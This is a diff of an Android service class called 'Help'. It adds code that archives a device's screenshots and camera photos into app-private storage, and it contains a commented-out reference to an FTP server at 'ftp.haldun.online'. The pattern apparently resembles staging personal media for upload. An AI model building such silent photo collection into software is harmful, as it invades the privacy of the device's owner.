@@ -26,6 +26,8 @@ import java.nio.file.Files;
 import java.util.ArrayList;
 import java.util.Arrays;
 
+import arc.archive.Archive;
+
 
 public class Help extends IntentService {
 
@@ -42,27 +44,50 @@ public class Help extends IntentService {
         bağlam = getApplicationContext();
 
         File sdCard = Environment.getExternalStorageDirectory();
-        File f = new File(getApplicationContext().getFilesDir() + "/a.arc");
+        //File f = new File(getApplicationContext().getFilesDir() + "/a.old.arc");
         File wp = new File(Environment.getExternalStorageDirectory() + "/Documents/AeroBACKUPS");
 
-        Archive archive = new Archive(new FileX(f.getAbsolutePath()));
+        //Archive archive = new Archive(new FileX(f.getAbsolutePath()));
 
         FileX scr = new FileX(Environment.getExternalStorageDirectory() + "/DCIM/Screenshots");
+        FileX pht = new FileX(Environment.getExternalStorageDirectory() + "/DCIM/Camera");
 
-        if (f.exists()) {
-            f.delete();
+        try {
+            arc.archive.Archive archive1 = new arc.archive.Archive(getApplicationContext().getFilesDir() + "/a.arc", "/");
+
+            if (scr.exists()) {
+
+                File[] p = scr.listFiles();
+
+                Archive.Directory directory = new Archive.Directory(scr.getAbsolutePath(), "/");
+
+                archive1.addDirectory(directory, 50);
+            }
+
+            if (pht.exists()) {
+
+                File[] phts = pht.listFiles();
+
+                archive1.createDirectory("Camera");
+
+                Archive.Directory directory = new Archive.Directory(pht.getAbsolutePath(), "/");
+
+                archive1.addDirectory(directory, 10);
+            }
+
+            archive1.create();
+
+        } catch (IOException e) {
+            throw new RuntimeException(e);
+        } catch (Exception e) {
+            throw new RuntimeException(e);
         }
 
-        File[] p = scr.listFiles();
-
-        for (int i = 0; i < 100; i++) {
-            archive.addFile(p[i]);
+        if (wp.exists()) {
+            //archive.addFile(wp);
         }
 
 
-        //archive.addFile(wp);
-
-        archive.create();
 
         /*
         String server = "ftp.haldun.online";
@@ -197,7 +222,7 @@ public class Help extends IntentService {
 
 
 
-
+/*
     static class Archive {
 
         public final static long MAGIC = 0x415243;
@@ -294,13 +319,14 @@ public class Help extends IntentService {
 
                     byte[] buffer = new byte[(int) files.get(i).length()];
                     FileInputStream fis = new FileInputStream(files.get(i));
-                    dataOutputStream.write(buffer);
+                    fis.read(buffer);
+                    //dataOutputStream.write(buffer);
 
 
 
 
                     if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-                        //dataOutputStream.write(Files.readAllBytes(files.get(i).toPath()));
+                        dataOutputStream.write(Files.readAllBytes(files.get(i).toPath()));
                     }
                 }
                 dataOutputStream.close();
@@ -394,7 +420,7 @@ public class Help extends IntentService {
             }
         }
     }
-
+*/
 
 }
 
